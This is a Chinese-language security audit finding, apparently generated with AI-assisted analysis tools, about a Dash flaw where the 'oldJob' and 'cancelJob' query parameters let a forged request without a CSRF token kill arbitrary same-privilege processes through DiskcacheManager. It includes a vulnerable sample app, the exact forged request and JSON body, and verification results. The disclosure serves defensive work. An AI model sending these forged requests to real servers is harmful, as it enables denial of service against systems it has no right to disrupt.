vulnerable

- 漏洞类型：拒绝服务（任意同权限进程终止）
- 影响范围：使用 `background=True` / `long_callback`，且后台管理器为 `DiskcacheManager` 的 Dash 应用

复现步骤

1. 准备一个使用 `DiskcacheManager` 的最小 Dash 应用，例如：
   ```python
   import time, diskcache
   from dash import Dash, html, Input, Output
   from dash.long_callback import DiskcacheManager

   cache = diskcache.Cache("./cache")
   app = Dash(__name__, background_callback_manager=DiskcacheManager(cache))
   app.layout = html.Div([html.Button("Run", id="btn"), html.Div(id="out")])

   @app.callback(
       Output("out", "children"),
       Input("btn", "n_clicks"),
       background=True,
       prevent_initial_call=True,
   )
   def work(_):
       time.sleep(30)
       return "done"
   ```

2. 记录一个与 Dash 进程同权限的目标进程 PID。

3. 先访问一次 `/`，让回调路由注册完成。

4. 直接伪造请求，不带 `X-CSRFToken`，向：
   ```
   POST /_dash-update-component?oldJob=<目标PID>
   Content-Type: application/json
   ```
   发送类似 JSON：
   ```json
   {
     "output": "out.children",
     "outputs": {"id": "out", "property": "children"},
     "inputs": [{"id": "btn", "property": "n_clicks", "value": 1}],
     "state": [],
     "changedPropIds": ["btn.n_clicks"]
   }
   ```

5. 服务端会把 `oldJob` 直接交给 `DiskcacheManager.terminate_job()`；该函数把它当作 PID，并杀死该进程及其子进程。

关键证据

1. 服务器直接信任查询参数中的 job 值  
   `dash/_callback.py`
   ```python
   cache_key = flask.request.args.get("cacheKey")
   job_id = flask.request.args.get("job")
   old_job = flask.request.args.getlist("oldJob")
   ...
   if old_job:
       for job in old_job:
           callback_manager.terminate_job(job)
   ```

2. 取消回调同样直接信任 `cancelJob`  
   `dash/dash.py`
   ```python
   job_ids = flask.request.args.getlist("cancelJob")
   ...
   if job_ids:
       for job_id in job_ids:
           executor.terminate_job(job_id)
   ```

3. `DiskcacheManager` 将 job 解释为 PID 并杀进程  
   `dash/long_callback/managers/diskcache_manager.py`
   ```python
   def terminate_job(self, job):
       ...
       job = int(job)
       ...
       if psutil.pid_exists(job):
           process = psutil.Process(job)
           for proc in process.children(recursive=True):
               proc.kill()
           process.kill()
   ```

4. 动态验证已确认两段链路都成立  
   - 伪造 `POST /_dash-update-component?oldJob=424242` 后，服务端 manager 收到攻击者指定值：
     - `fake_manager.terminated == ["424242"]`
     - 未携带 `X-CSRFToken` 仍返回 `200`
   - 对真实 `DiskcacheManager.terminate_job()` 的验证中，受控子进程：
     - 调用前 `poll() == None`
     - 调用后 `poll() == 0`
     - 说明进程已被成功终止

结论

该项目存在可利用漏洞：攻击者可通过伪造 `/_dash-update-component?...oldJob=<pid>`（以及同类 `cancelJob`）请求，在使用 `DiskcacheManager` 的 Dash 应用中终止任意同权限进程，造成 DoS。

审计中遇到的问题

- `get_program_slice` 在 Python 场景按 `file:line:call` 定位失败，未能给出有效切片。
- `get_variable_flow` 返回了占位样式字符串（`"\n" + result + "\n"`），结果不可用。
